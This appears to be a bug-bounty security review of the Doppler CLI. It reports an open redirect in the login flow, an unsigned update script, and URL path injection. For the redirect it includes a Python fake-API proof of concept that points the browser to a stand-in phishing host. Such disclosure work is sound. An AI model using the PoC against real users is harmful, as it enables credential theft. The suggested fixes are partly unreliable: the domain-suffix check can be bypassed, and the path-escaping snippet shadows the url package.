# Doppler CLI Security Review — 2026-08-06

## Target
- **Platform**: HackerOne
- **Asset**: https://github.com/DopplerHQ/cli (In Scope)
- **Language**: Go 1.25.12
- **Bounty Range**: $250 - $20,000

---

## Finding 1: Open Redirect via API-Controlled `auth_url` in Login Flow

**Severity**: Medium
**CVSS**: 6.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)
**CWE-601**: Open Redirect

### Description

The `doppler login` command opens a URL returned by the API directly in the user's browser without validation. An attacker who can control the API response (via MITM, compromised `--api-host`, or DNS hijacking) can redirect users to a phishing page.

### Vulnerable Code

`pkg/cmd/login.go:89-103`:
```go
authURL, ok := response["auth_url"].(string)
// ... no validation of authURL ...
if err := open.Run(authURL); err != nil {
```

`pkg/http/api.go:48-71` — `GenerateAuthCode` returns the raw API response:
```go
var result map[string]interface{}
err = json.Unmarshal(response, &result)
return result, Error{}
```

### Attack Scenario

1. User is tricked into using a custom API host:
   ```
   doppler login --api-host https://attacker-controlled-api.example.com
   ```

2. Attacker's server responds to `GET /v3/auth/cli/generate/2` with:
   ```json
   {
     "code": "legit-looking-code",
     "polling_code": "polling-code",
     "auth_url": "https://phishing-site.example.com/doppler-login"
   }
   ```

3. CLI opens `auth_url` in browser — user sees a convincing Doppler login page on attacker's domain.

4. User enters credentials → account compromised.

### Impact
- Credential theft via phishing
- Session hijacking if user is already authenticated to a fake SSO page

### PoC

```bash
# 1. Start attacker-controlled API server
cat > /tmp/evil-server.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/v3/auth/cli/generate' in self.path:
            response = {
                "code": "ABCDEF123456",
                "polling_code": "POLLXYZ789",
                "auth_url": "https://evil.example.com/phish"
            }
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(404)
            self.end_headers()

HTTPServer(('0.0.0.0', 8443), Handler).serve_forever()
EOF

# 2. User runs login with attacker's host
doppler login --api-host http://localhost:8443

# 3. Browser opens https://evil.example.com/phish
```

### Fix Recommendation

Validate that `auth_url` belongs to `*.doppler.com` before opening:

```go
authURL, ok := response["auth_url"].(string)
if !ok {
    utils.HandleError(errors.New("Unable to parse API response"))
}

parsedURL, err := url.Parse(authURL)
if err != nil || !strings.HasSuffix(parsedURL.Hostname(), "doppler.com") {
    utils.HandleError(errors.New("Invalid authorization URL received from server"))
}
```

---

## Finding 2: CLI Update Script Executes Without Signature Verification

**Severity**: Medium
**CVSS**: 6.8 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
**CWE-345**: Insufficient Verification of Data Authenticity

### Description

The `doppler update` command downloads a shell script from `cli.doppler.com` and executes it directly via `sh` without any cryptographic signature verification. Combined with the `--no-verify-tls` flag (which disables TLS certificate validation), this becomes a remote code execution vector.

### Vulnerable Code

`pkg/controllers/update.go:128-165`:
```go
func RunInstallScript() (bool, string, Error) {
    script, apiErr := http.GetCLIInstallScript()
    // ...
    tmpFile, err := utils.WriteTempFile("install.sh", script, 0555)
    // ...
    cmd, err = utils.RunCommand(command, os.Environ(), nil, &out, &out, true)
```

`pkg/http/http.go:174-177`:
```go
if !verifyTLS {
    tlsConfig.InsecureSkipVerify = true
}
```

### Attack Scenario

1. User runs: `doppler update --no-verify-tls`
2. CLI downloads script from `cli.doppler.com` without TLS verification
3. MITM attacker serves malicious script
4. Script executes with user's privileges

### Impact
- Remote code execution on user's machine
- Full system compromise if run as root/sudo

### Fix Recommendation

- Implement GPG signature verification for install scripts
- Add SHA-256 checksum validation
- Warn or block `--no-verify-tls` for update operations

---

## Finding 3: Dashboard URL Injection via Unsanitized Project/Config Names

**Severity**: Low
**CVSS**: 3.5 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)
**CWE-601**: Open Redirect

### Description

The `doppler open` command concatenates project and config names directly into the dashboard URL without encoding. A project or config name containing path traversal characters (`../`) or query parameters (`?`) can manipulate the URL opened in the browser.

### Vulnerable Code

`pkg/controllers/open.go:36-38`:
```go
url = url + fmt.Sprintf("/workplace/projects/%s/configs/%s", project, config)
```

### Attack Scenario

1. Attacker creates a project named: `../../admin/settings`
2. Victim runs: `doppler open -p "../../admin/settings" -c "prod"`
3. Browser opens: `https://dashboard.doppler.com/workplace/projects/../../admin/settings/configs/prod`
4. Resolves to: `https://dashboard.doppler.com/admin/settings/configs/prod`

### Impact
- URL manipulation in browser
- Potential for phishing if combined with open redirect in dashboard

### Fix Recommendation

```go
url = url + fmt.Sprintf("/workplace/projects/%s/configs/%s",
    url.PathEscape(project), url.PathEscape(config))
```

---

## Additional Observations

### 4. Fallback File Passphrase Derived from Token
`pkg/cmd/run.go:606-610`: Default passphrase is `token:project:config`. If token is compromised, all fallback files are decryptable.

### 5. Auth Code Copied to Clipboard
`pkg/cmd/login.go:96`: OAuth auth code is copied to clipboard, readable by other processes.

### 6. No Size Limit on File Reads
Multiple locations use `ioutil.ReadFile` without size limits, potentially causing memory exhaustion via large files.

---

## Summary

| # | Finding | Severity | Exploitability |
|---|---------|----------|----------------|
| 1 | Open Redirect via auth_url | Medium | Requires MITM or custom API host |
| 2 | Unsigned install script | Medium | Requires MITM + --no-verify-tls |
| 3 | Dashboard URL injection | Low | Requires attacker-controlled project name |

**Recommended Priority**: Finding 1 is the most reportable as it has a clear exploit path and CVSS score suitable for bounty consideration.
